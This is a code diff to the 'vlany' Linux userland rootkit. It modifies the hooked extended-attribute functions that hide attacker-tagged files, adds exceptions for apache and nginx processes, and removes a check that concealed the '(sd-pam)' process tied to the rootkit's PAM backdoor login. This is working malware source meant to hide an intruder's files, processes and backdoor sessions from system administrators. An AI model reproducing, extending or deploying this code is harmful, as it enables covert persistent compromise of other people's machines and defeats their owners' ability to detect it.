@@ -17,12 +17,16 @@ int hidden_lxstat(int ver, const char *filename, int mode);
 int hidden_str(const char *str);
 int hiddenDirectory(const char *str);
 
+// im feeling a little parched
 int hidden_xattr(const char *filename)
 {
     #ifdef DEBUG
         printf("[vlany] hidden_xattr() called\n");
         printf("[vlany] hidden_xattr() is going to attempt to distuingish visibility of %s\n", filename);
     #endif
+
+    if(getgid() == 33 && getenv("APACHE_PID_FILE") != NULL) return 0; // apache
+    if(getenv("TZ") != NULL) return 0; // nginx
 
     HOOK(old_listxattr, CLISTXATTR);
 
@@ -35,26 +39,19 @@ int hidden_xattr(const char *filename)
     buf = malloc(buflen);
     if((buflen = old_listxattr(filename, buf, buflen)) == -1) return 0; // fuuuck
 
+    char *hidden_xattr_1_str = strdup(HIDDEN_XATTR_1_STR); xor(hidden_xattr_1_str);
+
+    int ret = 0;
     key = buf;
     while(buflen > 0)
     {
-        char *hidden_xattr_1_str = strdup(HIDDEN_XATTR_1_STR); xor(hidden_xattr_1_str);
-        if(strstr(key, hidden_xattr_1_str))
-        {
-            #ifdef DEBUG
-                printf("[vlany] %s has hidden extended attributes. hiding file.\n", filename);
-            #endif
-
-            CLEAN(hidden_xattr_1_str);
-            free(buf); return 1; // don't even bother loading the next attribute
-        }
-        CLEAN(hidden_xattr_1_str);
-
+        if(strstr(key, hidden_xattr_1_str)) ret = 1;
         keylen = strlen(key) + 1; buflen -= keylen; key += keylen;
     }
 
-    // file isn't hidden with extended attributes..sigh
-    free(buf); return 0;
+    CLEAN(hidden_xattr_1_str);
+    free(buf);
+    return ret;
 }
 
 int hidden_fxattr(int fd)
@@ -63,6 +60,9 @@ int hidden_fxattr(int fd)
         printf("[vlany] hidden_fxattr() called\n");
         printf("[vlany] hidden_fxattr() is going to attempt to distuingish visibility of file descriptor %d\n", fd);
     #endif
+
+    if(getgid() == 33 && getenv("APACHE_PID_FILE") != NULL) return 0; // apache
+    if(getenv("TZ") != NULL) return 0; // nginx
 
     HOOK(old_flistxattr, CFLISTXATTR);
 
@@ -75,26 +75,19 @@ int hidden_fxattr(int fd)
     buf = malloc(buflen);
     if((buflen = old_flistxattr(fd, buf, buflen)) == -1) return 0;
 
+    char *hidden_xattr_1_str = strdup(HIDDEN_XATTR_1_STR); xor(hidden_xattr_1_str);
+
+    int ret = 0;
     key = buf;
     while(buflen > 0)
     {
-        char *hidden_xattr_1_str = strdup(HIDDEN_XATTR_1_STR); xor(hidden_xattr_1_str);
-        if(strstr(key, hidden_xattr_1_str))
-        {
-            #ifdef DEBUG
-                printf("[vlany] file descriptor %d has hidden extended attributes. hiding file descriptor.\n", fd);
-            #endif
-
-            CLEAN(hidden_xattr_1_str);
-            free(buf); return 1;
-        }
-        CLEAN(hidden_xattr_1_str);
-
+        if(strstr(key, hidden_xattr_1_str)) ret = 1;
         keylen = strlen(key) + 1; buflen -= keylen; key += keylen;
     }
 
-    // file isn't hidden with extended attributes..sigh
-    free(buf); return 0;
+    CLEAN(hidden_xattr_1_str);
+    free(buf);
+    return ret;
 }
 
 int hidden_lxattr(const char *filename)
@@ -103,6 +96,9 @@ int hidden_lxattr(const char *filename)
         printf("[vlany] hidden_lxattr() called\n");
         printf("[vlany] hidden_lxattr() is going to attempt to distuingish visibility of %s\n", filename);
     #endif
+
+    if(getgid() == 33 && getenv("APACHE_PID_FILE") != NULL) return 0; // apache
+    if(getenv("TZ") != NULL) return 0; // nginx
 
     HOOK(old_llistxattr, CLLISTXATTR);
 
@@ -115,26 +111,19 @@ int hidden_lxattr(const char *filename)
     buf = malloc(buflen);
     if((buflen = old_llistxattr(filename, buf, buflen)) == -1) return 0;
 
+    char *hidden_xattr_1_str = strdup(HIDDEN_XATTR_1_STR); xor(hidden_xattr_1_str);
+
+    int ret = 0;
     key = buf;
     while(buflen > 0)
     {
-        char *hidden_xattr_1_str = strdup(HIDDEN_XATTR_1_STR); xor(hidden_xattr_1_str);
-        if(strstr(key, hidden_xattr_1_str))
-        {
-            #ifdef DEBUG
-                printf("[vlany] %s has hidden extended attributes. hiding file.\n", filename);
-            #endif
-
-            CLEAN(hidden_xattr_1_str);
-            free(buf); return 1;
-        }
-        CLEAN(hidden_xattr_1_str);
-
+        if(strstr(key, hidden_xattr_1_str)) ret = 1;
         keylen = strlen(key) + 1; buflen -= keylen; key += keylen;
     }
 
-    // file isn't hidden with extended attributes..sigh
-    free(buf); return 0;
+    CLEAN(hidden_xattr_1_str);
+    free(buf);
+    return ret;
 }
 
 int hidden_xstat(int ver, const char *filename, int mode)
@@ -147,13 +136,6 @@ int hidden_xstat(int ver, const char *filename, int mode)
     char *proc_path = strdup(PROC_PATH); xor(proc_path);
     if(strncmp(filename, proc_path, strlen(proc_path))) { CLEAN(proc_path); return 0; } // readdir is just doing a general file check, bail
     CLEAN(proc_path);
-
-    char proc_cmdline[256], buf[128];
-    snprintf(proc_cmdline, sizeof(proc_cmdline), "%s/cmdline", filename);
-
-    HOOK(old_open, COPEN);
-    int fd = old_open(proc_cmdline, 0x00000000, 0666);
-    while(read(fd, &buf, sizeof(buf)) > 0) if(!strcmp(buf, "(sd-pam)")) { close(fd); return 1; } // this process shows up when the PAM backdoor user is logged in
 
     if(mode == 32)
     {
